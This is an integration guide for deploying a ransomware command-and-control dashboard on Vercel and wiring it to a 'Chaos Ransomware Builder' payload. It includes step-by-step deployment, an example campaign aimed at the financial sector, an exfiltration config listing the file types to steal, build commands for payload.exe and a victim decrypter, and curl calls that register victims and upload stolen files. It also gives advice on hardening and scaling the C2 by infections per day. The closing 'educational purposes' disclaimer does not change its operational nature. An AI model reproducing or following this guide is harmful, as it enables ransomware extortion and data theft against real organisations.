# Chaos C2 Dashboard - Integration Guide

Complete step-by-step guide to deploy the dashboard and integrate with Chaos Ransomware Builder payload.

## Prerequisites

- Node.js 18+ installed
- Vercel account (free tier works)
- Git repository (GitHub/GitLab/Bitbucket)
- Chaos Ransomware Builder project built and ready

---

## Step 1: Deploy Dashboard to Vercel

### Option A: Vercel CLI (Recommended)

```bash
# Navigate to dashboard folder
cd vercel-dashboard

# Install Vercel CLI globally
npm i -g vercel

# Login to Vercel
vercel login

# Deploy to production
vercel --prod
```

### Option B: Git Integration

1. Push `vercel-dashboard` folder to a Git repository
2. Go to [Vercel Dashboard](https://vercel.com/dashboard)
3. Click "Add New..." → "Project"
4. Import your repository
5. Framework Preset: **Other**
6. Build Command: `echo 'Static dashboard'`
7. Output Directory: `dashboard`
8. Click "Deploy"

### After Deploy

Note your deployment URL: `https://your-project.vercel.app`

---

## Step 2: Create Vercel KV Database

1. In Vercel Dashboard, select your project
2. Go to **Storage** tab
3. Click **Create Database** → **KV**
4. Name it (e.g., `chaos-c2-kv`)
5. Select region closest to your users
6. Click **Create**

### Configure Environment Variables

1. Go to **Settings** → **Environment Variables**
2. Add these two variables (from KV database details):

| Name | Value | Environment |
|------|-------|-------------|
| `KV_REST_API_URL` | `https://api.vercel.com/v1/kv/...` | Production, Preview, Development |
| `KV_REST_API_TOKEN` | `Bearer ...` | Production, Preview, Development |

3. **Optional**: Add master key for dashboard admin access:
| Name | Value | Environment |
|------|-------|-------------|
| `MASTER_API_KEY` | `master_$(openssl rand -hex 16)` | Production, Preview, Development |

4. Redeploy: `vercel --prod` (or push new commit)

---

## Step 3: Configure Payload

### Create Campaign

1. Visit `https://your-project.vercel.app/dashboard`
2. Click **Sign In** (top right)
3. Enter your `MASTER_API_KEY` from Step 2
4. Click **Campaigns** in sidebar
5. Click **+ Create Campaign**
6. Fill in:
   - **Name**: `Operation Goldmine`
   - **Description**: `Targeting financial sector`
   - **API Key**: Leave blank (auto-generates `ck_xxx`)
   - **RSA Key Size**: `4096`
   - **Status**: `Active`
7. Click **Create Campaign**
8. **Copy the API Key** (clipboard icon) - you'll need this for payload config

### Update Payload Config

Copy the template and customize:

```bash
cp vercel-dashboard/payload.config.dashboard.json payload.config.json
```

Edit `payload.config.json`:

```json
{
  "exfiltration": {
    "enabled": true,
    "serverUrl": "https://your-project.vercel.app",
    "apiKey": "ck_your_copied_campaign_key_here",
    "maxFileSizeMB": 50,
    "targetExtensions": [
      ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
      ".sql", ".db", ".sqlite", ".json", ".xml",
      ".cs", ".cpp", ".h", ".py", ".js", ".ts",
      ".ini", ".cfg", ".config", ".bak"
    ],
    "skipExtensions": [
      ".exe", ".dll", ".sys", ".msi", ".iso"
    ],
    "maxFiles": 1000,
    "compress": true,
    "encrypt": true,
    "timeoutSeconds": 30,
    "retryCount": 3,
    "retryDelaySeconds": 5
  }
}
```

**Critical**: Replace `your-project.vercel.app` with your actual Vercel deployment URL.

---

## Step 4: Use Enhanced Exfiltration Module

The standard `Exfiltration` class in `PayloadSource_v2.cs` only uploads files. For full dashboard integration (system registration, heartbeats, stats), replace it:

### Option A: Replace Entire Class

1. Open `PayloadSource_v2.cs`
2. Find the `Exfiltration` class (around line 1060)
3. Replace the entire class with contents of `vercel-dashboard/Exfiltration_FullIntegration.cs`
4. Add required `using` statements at top:
```csharp
using System.Text;
using System.Collections.Generic;
```

### Option B: Use Basic Compatible Version

If you only need file upload with metadata headers:

1. Replace `Exfiltration` class with `vercel-dashboard/Exfiltration_DashboardCompatible.cs`
2. This adds `X-File-Name` header for dashboard file tracking

---

## Step 5: Generate Keys & Build Payload

```bash
# In Chaos Ransomware Builder root directory

# Generate RSA-4096 key pair for campaign
dotnet run -- gen-keys -d ./keys -n mycampaign

# Build payload + decrypter
dotnet run -- build -c payload.config.json --keys-dir ./keys --key-name mycampaign
```

Output in `./output/`:
- `payload.exe` - The ransomware with dashboard integration
- `decrypter.exe` - Victim decryption tool
- `build.config.json` - Exact config used

---

## Step 6: Test Integration

### Test Dashboard API

```bash
# Test campaign creation
curl -X POST https://your-project.vercel.app/api/campaigns \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","apiKey":"ck_test123"}'

# Test system registration (simulates payload)
curl -X POST https://your-project.vercel.app/api/systems \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ck_test123" \
  -d '{"campaignId":"camp_abc123","victimId":"TEST-PC_user","systemInfo":{"hostname":"TEST-PC","username":"user","os":"Windows 10"}}'

# Test file upload
curl -X POST https://your-project.vercel.app/api/exfil/upload \
  -H "Authorization: Bearer ck_test123" \
  -H "X-File-Name: test.txt" \
  --data-binary @test.txt

# Test stats
curl "https://your-project.vercel.app/api/stats?range=7d"
```

### Test Payload (Safe Environment Only!)

1. Run `payload.exe` in isolated VM
2. Check dashboard:
   - **Overview** → Should show 1 infection
   - **Systems** → Should show your VM with hostname/IP
   - **Files** → Should show exfiltrated files
   - **Geographic** → Should show your location

---

## Step 7: Production Hardening

### Secure Dashboard Access

Add authentication middleware. Create `vercel-dashboard/api/_middleware.js`:

```javascript
// Simple IP allowlist
const ALLOWED_IPS = process.env.ALLOWED_IPS?.split(',') || [];

export default function middleware(request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() 
           || request.headers.get('x-real-ip');
  
  if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(ip)) {
    return new Response('Forbidden', { status: 403 });
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: ['/dashboard/:path*', '/api/:path*']
};
```

Add `ALLOWED_IPS` to Vercel env vars (comma-separated).

### Rate Limiting

```javascript
// In each API route, add:
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 m'),
});

const { success } = await ratelimit.limit(ip);
if (!success) return response.status(429).json({ error: 'Rate limited' });
```

### Enable Vercel Analytics

1. Project Settings → Analytics → Enable
2. Adds page views, performance metrics

---

## Payload → Dashboard Data Flow

```
┌────────────────────────────────────────────────────────────────────┐
│                        PAYLOAD EXECUTION                            │
└────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌────────────────────────────────────────────────────────────────────┐
│  1. FIRST RUN: Register System                                     │
│     POST /api/systems                                              │
│     Body: { campaignId, victimId, systemInfo }                    │
│     Headers: Authorization: Bearer <campaignKey>                  │
│     Response: { systemId, isNew }                                 │
└────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌────────────────────────────────────────────────────────────────────┐
│  2. PERIODIC: Heartbeat (every 60s)                                │
│     PUT /api/systems                                               │
│     Body: { id: systemId, stats: { filesEncrypted, ... } }        │
│     Updates: lastSeen, status=active, counters                    │
└────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌────────────────────────────────────────────────────────────────────┐
│  3. EXFILTRATION: Upload Files                                     │
│     POST /api/exfil/upload (per file)                              │
│     Headers: Authorization, X-File-Name, X-System-Id              │
│     Body: Raw file bytes (compressed/encrypted)                   │
│     Response: { fileId, success }                                 │
└────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌────────────────────────────────────────────────────────────────────┐
│  4. DASHBOARD: Real-time via SSE                                   │
│     GET /api/realtime/events?campaignId=...&types=stats,systems   │
│     Events: stats, systems, campaignStats, newFile, heartbeat     │
└────────────────────────────────────────────────────────────────────┘
```

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Dashboard shows "Disconnected" | SSE failing | Check Vercel function logs, verify 30s timeout |
| Systems not appearing | Payload can't reach API | Verify `serverUrl` in config, check firewall |
| "KV not configured" error | Missing env vars | Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` |
| Auth fails | Wrong API key | Use Campaign API Key (`ck_xxx`), not Master |
| Files upload but not in dashboard | Missing headers | Ensure `X-File-Name` header sent |
| Charts empty | No data yet | Wait for SSE or click Refresh |
| Large files missing | KV size limit | Hobby plan: 100KB/key - only metadata stored |
| CORS errors | Vercel config | Check `vercel.json` headers section |

---

## Vercel Function Logs

```bash
# View real-time logs
vercel logs your-project.vercel.app --follow

# Filter by function
vercel logs your-project.vercel.app --follow | grep "api/systems"
```

---

## Scaling Considerations

| Scale | Recommendation |
|-------|----------------|
| < 100 infections/day | Hobby plan OK |
| 100-1000/day | Pro plan (1GB KV, 1M reads) |
| 1000+/day | Enterprise + external DB (PlanetScale, Neon) |
| Large file storage | Use Vercel Blob or AWS S3 instead of KV |

---

## Security Checklist

- [ ] Master API Key stored only in Vercel env vars (not in code)
- [ ] Campaign API Keys rotated periodically
- [ ] Dashboard deployed to protected preview or with auth middleware
- [ ] IP allowlist configured for admin access
- [ ] Rate limiting enabled on API routes
- [ ] Audit logging for sensitive operations (campaign delete, key regen)
- [ ] Payload uses HTTPS only (enforced by Vercel)
- [ ] KV data encrypted at rest (Vercel default)

---

## Support Files

| File | Purpose |
|------|---------|
| `vercel-dashboard/Exfiltration_FullIntegration.cs` | Full payload module with registration + heartbeats |
| `vercel-dashboard/Exfiltration_DashboardCompatible.cs` | Basic module with file upload headers |
| `vercel-dashboard/payload.config.dashboard.json` | Pre-configured payload config template |
| `vercel-dashboard/README.md` | Full dashboard documentation |
| `vercel-dashboard/INTEGRATION_GUIDE.md` | This file |

---

## Next Steps

1. **Customize Dashboard**: Modify `dashboard/app.js` for additional charts, views, or branding
2. **Add Webhooks**: Discord/Slack/Telegram alerts on new infections
3. **Implement Commands**: C2 command queue for payload tasking
4. **Add Encryption**: Encrypt KV data at application layer
5. **Build Mobile App**: React Native wrapper for dashboard

---

**⚠️ Legal Notice**: This software is for educational/research purposes only. Unauthorized deployment against systems you don't own or have explicit permission to test is illegal. The authors assume no liability for misuse.